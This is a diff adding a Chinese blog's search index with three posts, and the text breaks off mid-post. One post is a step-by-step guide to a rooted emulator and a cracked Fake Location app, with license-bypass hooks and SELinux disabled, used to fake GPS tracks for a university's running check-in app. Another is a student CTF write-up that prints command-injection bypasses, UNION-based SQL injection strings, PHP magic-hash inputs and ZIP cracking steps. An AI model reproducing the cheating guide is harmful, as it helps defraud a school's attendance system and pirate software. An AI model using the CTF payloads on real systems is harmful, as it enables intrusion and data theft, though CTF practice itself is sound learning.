@@ -1,0 +1,982 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>基于 Root 环境下的 Fake Location 虚拟定位</title>
+    <url>/2024/03/09/%E5%9F%BA%E4%BA%8ERoot%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84Fake%20Location%E8%99%9A%E6%8B%9F%E5%AE%9A%E4%BD%8D%E6%95%99%E7%A8%8B/Fake-Location/</url>
+    <content><![CDATA[<p><strong>文章内含已Root虚拟机资源。</strong></p>
+<p>成功实现虚拟定位后，可实现包括但不限于以下操作：减轻校园跑步打卡压力、游戏改战区、点亮地图/足迹……<br><img src="https://s2.loli.net/2024/03/09/2eWFJYGtjyEfwci.jpg" alt="41d10a457499b9070bc577c17c34a0efa7540f39.jpg"></p>
+<span id="more"></span>
+
+<h1 id="风险警告"><a href="#风险警告" class="headerlink" title="风险警告"></a>风险警告</h1><p><code>在 Root 环境内可能出现的风险，如：账号被冻结/封禁、腾讯 TP 监测无法通过、部分软件不允许在 Root 环境下运行……</code></p>
+<p>在遵循本教程操作前应悉知可能存在的风险，并自行决定是否继续学习操作，对造成的损失作者不负任何责任。</p>
+<hr>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>本教程所需的所有资源：<a href="https://www.alipan.com/s/f2NLwDvZ7ap">阿里云盘资源链接</a>（超过蓝奏云单次文件大小，只能用阿里云盘了。由于阿里云盘不支持 .zip 文件分享，所以创建的是自释放程序 .exe ，双击运行解压）。</p>
+<h2 id="第一步·安装-影子虚拟机"><a href="#第一步·安装-影子虚拟机" class="headerlink" title="第一步·安装 影子虚拟机"></a>第一步·安装 影子虚拟机</h2><p>安装 <code>影子虚拟机240_美化版_带面具lsp.apk</code> ，这个虚拟机已 Root 并刷入 Magisk 模块与 LSPosed ，可以直接进行下一步。</p>
+<h2 id="第二步·导入并安装软件"><a href="#第二步·导入并安装软件" class="headerlink" title="第二步·导入并安装软件"></a>第二步·导入并安装软件</h2><p>打开影子虚拟机，用桌面右下角<strong>文件中转</strong>功能将 <code>Fake Location_1.2.1.8.apk</code>、<code>MT管理器.apk</code>、<code>vipHook_1.4.4.7.apk</code>、<code>对话框取消修复版_1.0.1.apk</code> 4个安装包全部转入虚拟机并安装。</p>
+<h2 id="第三步·配置环境"><a href="#第三步·配置环境" class="headerlink" title="第三步·配置环境"></a>第三步·配置环境</h2><h3 id="Magisk"><a href="#Magisk" class="headerlink" title="Magisk"></a>Magisk</h3><p>打开 Magisk 确保里面的 3 个模块都已启用。</p>
+<h3 id="LSPosed"><a href="#LSPosed" class="headerlink" title="LSPosed"></a>LSPosed</h3><p><code>以下设置是为了我们使用破解版 Fake Location 时能忽略运行时的强制更新弹窗，并能使用高级功能。</code></p>
+<p>打开 LSPosed ，根据点击下方<strong>模块</strong>，再点击<strong>对话框取消修复版</strong>。</p>
+<p><img src="https://s2.loli.net/2024/03/09/eKwb1aoIHqQpkRf.png" alt="LSP配置1"></p>
+<p>点击右上角搜索 fake 。</p>
+<p><img src="https://s2.loli.net/2024/03/09/4wSdlGE2CTJoN1V.png" alt="LSP配置2"></p>
+<p>打开 Fake Location 的开关，并点击右下角设置。</p>
+<p><img src="https://s2.loli.net/2024/03/09/LdMmeQki9TyJrhY.png" alt="LSP配置3"></p>
+<p>把下图所示 4 个开关全打开，并搜索fake，点击进入。</p>
+<blockquote>
+<p>Tip: 如果搜不到图中项目，就返回桌面运行一下 Fake Location 再次尝试。</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2024/03/09/D5EVG1jqgWuC6Zx.png" alt="LSP配置4"></p>
+<p>启用设置，并打开前两项。</p>
+<p><img src="https://s2.loli.net/2024/03/09/ftCsqMT8hnD1blV.png" alt="LSP配置5"></p>
+<p>向下翻找到 <strong>版本自定义</strong> 并启用，点击<strong>自定义版本号</strong>，设置为 99999 。</p>
+<p><img src="https://s2.loli.net/2024/03/09/FctlI1KPmvGYW5U.png" alt="LSP配置6"></p>
+<p>回到 <strong>LSPosed 模块界面</strong>，点击 <strong>vipHook</strong> 。启用并搜索 <strong>fake</strong> ，勾选。</p>
+<p><img src="https://s2.loli.net/2024/03/09/9ugrwofjdhSxQaJ.png" alt="LSP配置7"></p>
+<p>现在 Fake Location 不会再弹出更新弹窗，并且可以使用高级功能了。</p>
+<h3 id="权限设置"><a href="#权限设置" class="headerlink" title="权限设置"></a>权限设置</h3><p>有时使用 Fake Location 会遇到卡死问题，这是因为系统权限处于严格状态，改成宽松状态即可，接下来是教程。</p>
+<p>打开 <strong>MT管理器</strong> ，点击左上角三个杠，点击<strong>终端模拟器</strong>，第一次使用可能要安装。</p>
+<p><img src="https://s2.loli.net/2024/03/09/34aVcDvTjAZw7ul.png" alt="权限设置8"></p>
+<ul>
+<li>打开命令行后输入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>
+<p>并回车。</p>
+<p>前面的 → 变为 # 说明有效。</p>
+<ul>
+<li>再输入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
+
+<p>并回车。</p>
+<p>不提示任何东西，不报错说明成功。请重启虚拟机以确保更改全部应用。</p>
+<p><img src="https://s2.loli.net/2024/03/09/9BSUrWREXzvgkNd.png" alt="权限设置9"></p>
+<p>恭喜你，自此所有设置都已完成，已经可以顺利使用虚拟定位了。接下来是虚拟定位实战举例。</p>
+<h1 id="实战运用·同天智慧校园"><a href="#实战运用·同天智慧校园" class="headerlink" title="实战运用·同天智慧校园"></a>实战运用·同天智慧校园</h1><h2 id="使用-Fake-Location-进行体育跑步打卡。"><a href="#使用-Fake-Location-进行体育跑步打卡。" class="headerlink" title="使用 Fake Location 进行体育跑步打卡。"></a>使用 Fake Location 进行体育跑步打卡。</h2><ul>
+<li><p>打开 <strong>Fake Location</strong> ，点击<strong>加号</strong>添加位置，在地图上找到太极运动场，单击<strong>跑道区域（避开禁区）</strong>，点击右下角勾选定位置，点击<strong>启动模拟</strong>。</p>
+</li>
+<li><p>成功启动模拟后，打开<strong>摇杆</strong>，在弹出的<strong>摇杆悬浮窗界面</strong>点击右下方<strong>方块</strong>打开设置，速度设置为<strong>汽车</strong>，打开<strong>步频模拟</strong>和<strong>GPS定位模拟</strong>。</p>
+</li>
+<li><p>打开同天智慧校园开始跑步，使用摇杆将位置调整到要移动的下一个位置，等待路径红线出现（移动时不会出现红线，需要等待，出现红线才代表小程序记录了你的移动），重复操作即可。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>同天智慧校园</tag>
+        <tag>破解</tag>
+        <tag>重庆邮电大学</tag>
+        <tag>Root</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024新年快乐！</title>
+    <url>/2024/01/01/2024%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/2024%20new%20year/</url>
+    <content><![CDATA[<h1 id="新-年-快-乐！"><a href="#新-年-快-乐！" class="headerlink" title="新 年 快 乐！"></a>新 年 快 乐！</h1><p><img src="https://s2.loli.net/2024/01/05/ltpaB4VwyMG7f5C.jpg" alt="新年快乐！"></p>
+<p><code>这一年,遇见,获得,失去,成长,释怀,完结,我与旧事归于尽,来年依旧迎花开.</code></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>红岩杯 CTF 我的 WP</title>
+    <url>/2023/11/12/FULLWP/CTFFULL/</url>
+    <content><![CDATA[<h1 id="这是重邮-CTF-新生赛“红岩杯”我做出来的题的WP"><a href="#这是重邮-CTF-新生赛“红岩杯”我做出来的题的WP" class="headerlink" title="这是重邮 CTF 新生赛“红岩杯”我做出来的题的WP"></a>这是重邮 CTF 新生赛“红岩杯”我做出来的题的WP</h1><p>千辛万苦打了一个星期，结果离三等奖还差91分呜呜呜呜</p>
+<span id="more"></span>
+<h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="easy-qrcode"><a href="#easy-qrcode" class="headerlink" title="easy_qrcode"></a>easy_qrcode</h3><p>下载附件得到 4 个图片，插入进 PPT 调整后得到完整二维码</p>
+<p><img src="https://s2.loli.net/2023/11/11/UMHZdXKa97cQwo1.png" alt="209681feb82a8ce0f9dc54fed551f6a5.png"></p>
+<p>扫描可得flag为 <code>0xFA&#123;It&#39;s_really_easy&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/LpWnsJ1Um9gCVR7.png" alt="a024b078f8ac45fe5bc71d6f66cdfd9e.png"></p>
+<h3 id="easy-traffic"><a href="#easy-traffic" class="headerlink" title="easy_traffic"></a>easy_traffic</h3><p>下载附件后使用 Wireshark 打开</p>
+<p><img src="https://s2.loli.net/2023/11/12/JlgouzKnjieHqVS.png" alt="c61a2f5e5771fb49c3e92ceecc163d22.png"></p>
+<p>发现 flag.txt 关键字</p>
+<p><img src="https://s2.loli.net/2023/11/12/ZM6sq29Wt4XJQ8o.png" alt="43443937601fc11b534c62398031f978.png"></p>
+<p>追踪 HTTP 流</p>
+<p><img src="https://s2.loli.net/2023/11/12/cRSi8ysV3q1fwxt.png" alt="a737384101d25417e262dee9dbed7517.png"></p>
+<p>得到 flag 为 <code>0xFA&#123;Try_to_cAtCh_oceaner&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/6DHzWgT2mLEKVtG.png" alt="829ac8518989e41ed59dba2a4267c9c4.png"></p>
+<h3 id="easy-zip"><a href="#easy-zip" class="headerlink" title="easy_zip"></a>easy_zip</h3><p>打开文件，发现有解压密码。</p>
+<p><img src="https://s2.loli.net/2023/11/11/mLOo5UaKqyiR6Vx.png" alt="5c4614683aa0f61a5cae71d46f2c62b8.png"></p>
+<p>尝试弱口令 <code>123456</code> 。</p>
+<p>成功解压，得到flag<code>0xFA&#123;Passw0rd_is_123456&#125;</code></p>
+<p><img src="https://s2.loli.net/2023/11/11/kGEYVwXPjvZT7C1.png" alt="91cc0d8878543f2eacb643844f313703.png"></p>
+<h3 id="神秘的声音"><a href="#神秘的声音" class="headerlink" title="神秘的声音"></a>神秘的声音</h3><p>下载附件，听到奇奇怪怪的声音，也不是摩斯密码。</p>
+<ul>
+<li>尝试用 Audacity 打开，啥也没有。</li>
+<li>看 16 进制文件，也没藏文件。</li>
+<li>想到 mmsstv 工具</li>
+</ul>
+<p>先配置下录音默认为立体声混音。</p>
+<p><img src="https://s2.loli.net/2023/11/11/QfByDzbhJWj7aLi.png" alt="6db95a928a9ec4e7b240227b9c9b948a.png"></p>
+<p>打开 mmsstv 之后播放附件得到图片，上面有 flag 为 <code>redrock&#123;MMSSTV&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/7mhFvyxpETUgXrd.png" alt="11d983cc2991a45320bb005eab1ead14.png"></p>
+<h3 id="哪里难了？"><a href="#哪里难了？" class="headerlink" title="哪里难了？"></a>哪里难了？</h3><p>下载附件 docx ，打开发现明显是与佛论禅，解密后发现是 CTF 圣经（<br>读完了反思自己一下，不过什么帮助。<br>Word 选项里勾选显示隐藏的文字，得到<code>PBVWU6DVNFYXWY3LGFUTA43LEB5DAICJLJGCAYZQPBZGU7I=</code></p>
+<p><img src="https://s2.loli.net/2023/11/11/7KAm9VMWcSgUNQG.png" alt="93430b1936f9abd23a4d3e69990b2b8e.png"></p>
+<p>结尾标志性等号，而且只有大写字母。译言丁真，鉴定为 <code>base32编码</code> ，解码获得 <code>xkjxuiq&#123;ck1i0sk z0 IZL c0xrj&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/OboE5PJzBycVmX8.png" alt="984d265ec115ac9d78e7285a0e952f36.png"></p>
+<p>flag 格式有了，但是内容不对，猜测为凯撒密码，位移 6 位后得到 flag 是 <code>redrock&#123;we1c0me t0 ctf w0rld&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/cFUMVdEObvzTqyY.png" alt="b0fcfa7ec9e45950f2e9da3d072a482f.png"></p>
+<p>高高兴兴去提交结果发现不对？？？？？？？绞尽脑汁想了半天然后去问下出题人是不是我还没解完，出题人说：可能是哪里差一点。</p>
+<p>然后我想啊想，发现题目上有 <code>众所周知CTF哪里难了，还不是你不够努力！</code> ，与佛论禅解密出来也是 CTF 圣经，就把 ctf 改成大写 CTF ，得 flag 为 <code>redrock&#123;we1c0me t0 CTF w0rld&#125;</code> 提交成功。</p>
+<p>不过后来好像说题目有问题？？？？我舍友去问出题人的时候，出题人说这题有点问题，然后告诉他们把 CTF 改成大写提交，呜呜呜呜呜呜当时我自己花那么大劲想出来结果问一下就得到了。</p>
+<h3 id="easy-unpack"><a href="#easy-unpack" class="headerlink" title="easy_unpack"></a>easy_unpack</h3><p>这题说来惭愧，下载附件打开发现是循环压缩包，懒得写脚本解压，就直接使用连点器配合 7-zip 硬点到最后一层，得到 txt 文件，里面存着 flag <code>0xFA&#123;0nly_oceaner_Can_dec0mPress&#125;</code> 。</p>
+<p>可是当时不知道要写 WP ，文件就没保存，就不再复现一次截图了 QwQ ，点了好久呢，还要一直盯着，防止到最后一层点到其他的东西功亏一篑。</p>
+<h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p>如题，关注重邮小帮手,发送 CQUPT_REDROCK_CTF@2023 即可获得 flag 。</p>
+<h3 id="yyz-想要回到过去"><a href="#yyz-想要回到过去" class="headerlink" title="yyz 想要回到过去"></a>yyz 想要回到过去</h3><p>下载附件，直接运行 exe 闪一下就没了，打开终端，输入 <code>.\checktime.exe</code> 得到 <code>sorry buddy, but your are in 2023-11-10 14:13:15</code> 。</p>
+<p>阅读理解，<code>yyz的目标是回到2019年的那个夏天</code> 。把系统时间改为 2019 的 6 月。</p>
+<p><img src="https://s2.loli.net/2023/11/11/JSpT8fhLtAVrwUc.png" alt="b8be20cc6a4968a79348294ad9c8a780.png"></p>
+<p>打开终端，输入 <code>.\checktime.exe</code> 得到 flag ：</p>
+<p><img src="https://s2.loli.net/2023/11/11/ixgd4czh3eMBKlP.png" alt="7d888b0353f8854aef74a503139ca83c.png"></p>
+<p>故事写的很感人，真的泪目了，最后还刀我一下😭</p>
+<h3 id="海燕的秘密"><a href="#海燕的秘密" class="headerlink" title="海燕的秘密"></a>海燕的秘密</h3><p>下载附件，打开压缩包发现有加密，试了弱口令不行，用 ARCHPR 爆破纯数字密码，成功获得密码 <code>655351</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/BACRs3JmIcqEknh.png" alt="0dc9e3df86b689c5faa1d4ff84a6052d.png"></p>
+<p>解压后发现又有一个加密压缩包和一个 txt 文件，打开 txt 文件发现明显是字典，用用 ARCHPR 字典攻击，得到密码 <code>snaKa_al?-Se</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/QisaeNAtJyuRvr3.png" alt="55e7762f64d7f55e0942de3fbb9290e1.png"></p>
+<p>解压后发现又双叒叕有一个加密压缩包，还有一个 txt 文件，发现 txt 在加密压缩包内也存在，明显是明文攻击。将 txt 压缩为 zip 后，用 ARCHPR 明文攻击得秘钥 <code>4ea7d0d2 becef2b6 197a8f88</code> ，利用秘钥保存文件。</p>
+<p>解压压缩包发现有一个 png 文件， WinHex 查看发现文件末尾有 PK 字样，明显有压缩包隐写在图片内。</p>
+<p><img src="https://s2.loli.net/2023/11/11/CFugb5UealMn6BQ.png" alt="25c9092d42649022e33b3ff3c16c2483.png"></p>
+<p>把图片丢进 foremost 。查看输出文件，发现又有一个加密压缩包。至此，基本上所有压缩包能玩的花样都玩过了，还剩一个伪加密。再用 WinHex 打开该压缩包，发现的确是伪加密，把 6、7 位改成 00 00 ，保存文件。</p>
+<p><img src="https://s2.loli.net/2023/11/11/PrKuyGYhdsbTWig.png" alt="29d027aa84f949e8802a2c9238936de8.png"></p>
+<p>发现可以直接解压了，得到 <code>flag.png</code> ，里面显示 flag 为 <code>redrock&#123;grEa1e_y0u_Kn0w_h0w_t0_uSe_21p&#125;</code> 。藏得确实深啊，我以为明文攻击之后就结束了，没想到我是小丑🤡。</p>
+<h3 id="easy-wordle"><a href="#easy-wordle" class="headerlink" title="easy_wordle"></a>easy_wordle</h3><p>不走寻常路，用统计学和概率学方法解题。</p>
+<p>下载 2 个附件，查看 py 源码可知道，会在 wordlist 里随机挑一个 5 个字母的单词让我们猜，共有 6 次机会。</p>
+<p>输入一个 5 个字母的单词:</p>
+<ul>
+<li>如果字母和位置都正确，则该位输出为“绿”；</li>
+<li>如果字母在单词里出现，但位置不正确，则该位输出为“黄”；</li>
+<li>如果字母在单词里不存在，则该位输出为“灰”。</li>
+</ul>
+<p>使用玄学解法，做一点准备工作：</p>
+<ul>
+<li>先对 wordlist 进行字频统计，统计出出现频率较的字母 e、a、r、o 等，作为我们的突破点。</li>
+<li>再将 wordlist 放在 Word 内，使用高级查找，勾选通配符。</li>
+</ul>
+<p>开始解题！！！</p>
+<p>用 nc 连接靶机（用若干次尝试之后成功的的一次举例）<br>第一次尝试 <code>eeeee</code> ，返回结果 <code>灰灰灰灰灰</code> ，运气不太好。<br>第二次尝试 <code>aaaaa</code> ，返回结果 <code>绿黄黄黄黄</code> ，可以确定第一位为 <code>a</code> 。<br>第三次尝试 <code>rrrrr</code> ，返回结果 <code>黄绿绿黄黄</code> ，人品大爆发，确定前三位 <code>arr</code> 。使用Word高级搜索锁定 <code>array</code> 和 <code>arrow</code> 两个单词。<br>第四次尝试 <code>array</code> 不正确。<br>第五次尝试 <code>arrow</code> 正确，获得 flag ！！！</p>
+<p><img src="https://s2.loli.net/2023/11/11/lsdTgqpw2iQD6oY.png" alt="c71309c4c11e01245d19c3e06743f8de.png"></p>
+<h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>做完问卷调查得到flag <code>Redrock&#123;Hacking_For_Fun :)&#125;</code> 。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p>访问靶机，查看 php 源码，可知会用 get 的方式获取 a1、a2 两个参数，从 cookie 获取 b 参数，从 post 方式获取 file 参数。这题使用 HackBar 工具解题。</p>
+<ul>
+<li>首先看 level 1：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a1</span> != <span class="variable">$a2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$a2</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Yes!&quot;</span>;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No~&quot;</span>;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>如果 a1 、a2 的值不相等，但md5运算后的值相等（弱比较）则可进入 level 2</p>
+<p>经过搜索得知：</p>
+<blockquote>
+<p>因为处理hash字符串时，PHP会将每一个以 <code>0E</code> 开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 <code>0E</code> 开头的，那么PHP会认为它们相同。</p>
+</blockquote>
+<p>基本的原理是这样的，但更严谨的字符串格式是 <code>0e</code> 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（== 的结果为 True，但 === 的结果为 False）。</p>
+<p>一些 md5 值是 <code>0e</code> 开头且后面均为数字的字符串：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br></pre></td></tr></table></figure>
+
+<p>随便挑两个作为 a1 、a2 的值并用 get 方法传递给 a1 、a2 ，进入 level 2：</p>
+<p><img src="https://s2.loli.net/2023/11/11/ueFtKi7Jz8DB1HE.png" alt="400f89e81c13cfe199c6bf749c1639c6.png"></p>
+<ul>
+<li>再看 level 2：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$b</span> !== <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YesYse!&quot;</span>;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NoNo~&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>要求 b 不为 114514 ，但 b 取整为 114514 。很简单，设置 cookie 中 b = 114514.1 即可进入 level 3：</p>
+<p><img src="https://s2.loli.net/2023/11/11/5QaZADoP4TmdhyO.png" alt="2737e67c4d42c2185105851f4e1996dc.png"></p>
+<ul>
+<li>最后看 level 3：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$c</span>) == <span class="string">&quot;I wanna the last key&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YesYesYes!&quot;</span>;</span><br><span class="line">        <span class="variable">$key3</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NoNoNo~&quot;</span>;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+
+<p>搜索得知：</p>
+<blockquote>
+<p>file_get_contents() 是一个 PHP 内置函数，用于以字符串的形式获取指定文件的内容。使用该函数可以读取本地的文件、远程文件和 HTTP 请求的响应等内容。</p>
+</blockquote>
+<p>也就是说只要路径 c 内的文件内容是 <code>I wanna the last key</code> 即可获取 flag 。</p>
+<p>上传一个内容是 <code>I wanna the last key</code> 的txt到我的一个码云仓库，将 raw 的 URL 链接用 post 方法传递给 c ，获得 flag ：</p>
+<p><img src="https://s2.loli.net/2023/11/11/fxlkhzKsSCIYrit.png" alt="001ebc369a04da6517d9441a92c21455.png"></p>
+<h3 id="诶我flag呢！"><a href="#诶我flag呢！" class="headerlink" title="诶我flag呢！"></a>诶我flag呢！</h3><p>读题：</p>
+<blockquote>
+<p>老板让 tiger 把 flag 藏在某个一个页面里面，结果她藏完了之后还没来得及保存就停电了，这咋搞啊！！！</p>
+</blockquote>
+<p>经过搜索：</p>
+<blockquote>
+<p>当vim异常退出时，都会生成一个用于备份缓冲区内容的swp临时文件，来记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。<br>❖ 第一次产生的交换文件名为 .index.php.swp<br>❖ 再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>❖ 第三次产生的交换文件则为 .index.php.swn</p>
+</blockquote>
+<p>在靶机地址后面加上 <code>\.index.php.swp</code> 访问，触发文件下载。将下载的文件用记事本打开，看到flag <code>redrock&#123;7hank_u_f1nd_1t_f0r_tiger&#125;</code></p>
+<p><img src="https://s2.loli.net/2023/11/11/YtfK6UzWyuIwZhi.png" alt="41abe879e9e73056734a3440a99fba67.png"></p>
+<h3 id="可曾听闻ping？"><a href="#可曾听闻ping？" class="headerlink" title="可曾听闻ping？"></a>可曾听闻ping？</h3><p>访问靶机，发现可以执行 ping 命令，想到命令注入。<br>使用管道符 | ，可以直接执行 | 后面的语句。</p>
+<p>输入 <code>|ls</code> 扫描当前目录：<br>返回了 <code>index.php index.php</code> ，没有发现 flag 关键字。</p>
+<p><img src="https://s2.loli.net/2023/11/11/IvVguJ1E5DZopFK.png" alt="e1f593ea1a9ffed0a193ba9ffd2ff40f.png"></p>
+<p>再尝试 <code>|ls /</code> 扫描根目录：<br>返回 <code>bin boot dev etc fl4g home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv start.sh sys tmp usr var var</code> 发现 fl4g 关键字。</p>
+<p><img src="https://s2.loli.net/2023/11/11/2jFkKImyQq1rv5P.png" alt="f50892bf07088ac014b6b4be24a8c4ac.png"></p>
+<p>尝试 <code>|cat /fl4g</code> 读取flag文件：<br>返回 <code>才不会让你这么轻易拿到flag！</code></p>
+<p><img src="https://s2.loli.net/2023/11/11/Hy1odeIwEJs7AhW.png" alt="9b08223f7fd61ef86f041b7a713ba7cf.png"></p>
+<p>分别尝试 <code>|cat</code> 和 <code>|f4lg</code> 均返回 <code>才不会让你这么轻易拿到flag！</code> 猜测对二者都进行了过滤，尝试使用 \ 绕过过滤。输入 <code>|ca\t /fl\4g</code> 读flag文件：<br>成功获得flag。</p>
+<p><img src="https://s2.loli.net/2023/11/11/n8mpvasGzODRYx2.png" alt="98697ca80e6cac34e52ef1a6586bf409.png"></p>
+<h3 id="oceaner的网站"><a href="#oceaner的网站" class="headerlink" title="oceaner的网站"></a>oceaner的网站</h3><p>简单题，访问靶机，按F12就可看到flag <code>redrock&#123;F12_is_c0nv3n1ent&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/gjR5cbGCfQ3yWlU.png" alt="2ce7676a1090f2419d10ee10e6cf7c81.png"></p>
+<h3 id="点击就送flag（web版）"><a href="#点击就送flag（web版）" class="headerlink" title="点击就送flag（web版）"></a>点击就送flag（web版）</h3><p>访问靶机看到 <code>游戏规则：在 5s 内成功点击红色圆球50次即可得到flag。</code> 今天就是猎杀来了都做不到（</p>
+<p>查看源代码，发现使用 count 变量存储点击次数，且点击开始游戏后会先将 count 归零。</p>
+<p><img src="https://s2.loli.net/2023/11/11/E4KHlPDyr1Izuvi.png" alt="b63c522c560fd38b73e578d2d28129af.png"></p>
+<p>解题策略：先点击开始游戏，随后在控制台输入 <code>count=50</code> 再象征性点几下红点，成功获取 flag <code>redrock&#123;js_1s_s0_e@syyyy&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/XkSrzc8i2pjK1UH.png" alt="210057538a49487f29787dcbaefc9a44.png"></p>
+<h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h3><p>如题，简单的 SQL 注入。可以用 SQLmap 直接写，但是我一开始不知道，是手动注入的，呜呜呜。</p>
+<p>访问靶机，发现有查询框，随便查询一个 1 ，发现返回了数据，且地址栏多了个叫 <code>id</code> 的参数，猜测 <code>id</code> 是可进行注入的。使用 HackBar 进行 get 传参。</p>
+<p>尝试发现 <code>id</code> 不是字符型，是整型。由于本题几乎没有过滤，可以采用手动联合注入。</p>
+<p>先通过 <code>order by</code> 判断列数，测试直到 <code>?id=1 order by 2</code> 运行都有显示，直到 <code>?id=1 order by 3</code> 没有回显，并报错 <code>查询失败: Unknown column &#39;3&#39; in &#39;order clause&#39;</code> ，可知一共有 2 列。</p>
+<p>然后测试回显位，前面给一个无法查询的数据 <code>?id=0</code> 这样返回的就是测试位，后面跟上 <code>union select 1,2</code> 测试回显位，返回为：</p>
+<table>
+<thead>
+<tr>
+<th align="left">ID</th>
+<th align="left">Username</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">2</td>
+</tr>
+</tbody></table>
+<p>证明该位为回显位。</p>
+<p>接下来是一些正常的注入。使用 <code>?id=0 union select 1,group_concat(schema_name) from information_schema.schemata</code> 返回表格：</p>
+<table>
+<thead>
+<tr>
+<th align="left">ID</th>
+<th align="left">Username</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">information_schema,test</td>
+</tr>
+</tbody></table>
+<p>然后可以选择数据库进行读取，这里选择 <code>test</code> 进行读取。开始查询表名，使用 <code>?id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;test&#39;</code> 查询到一个名为 <code>flag</code> 的表名：</p>
+<table>
+<thead>
+<tr>
+<th align="left">ID</th>
+<th align="left">Username</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">flag,users</td>
+</tr>
+</tbody></table>
+<p>继续使用 <code>?id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code> 查询 flag 的列名，查询到有字段为 flag ：</p>
+<table>
+<thead>
+<tr>
+<th align="left">ID</th>
+<th align="left">Username</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">flag</td>
+</tr>
+</tbody></table>
+<p>紧接着通过 <code>?id=0 union select 1,group_concat(flag) from flag</code> 获得 flag 。</p>
+<p><img src="https://s2.loli.net/2023/11/11/1qfL2ANeYm7aHjX.png" alt="a817d2077b860afb868d38d2d02d74a7.png"></p>
+<h3 id="你是man吗？"><a href="#你是man吗？" class="headerlink" title="你是man吗？"></a>你是man吗？</h3><p>访问靶机，看到代码：</p>
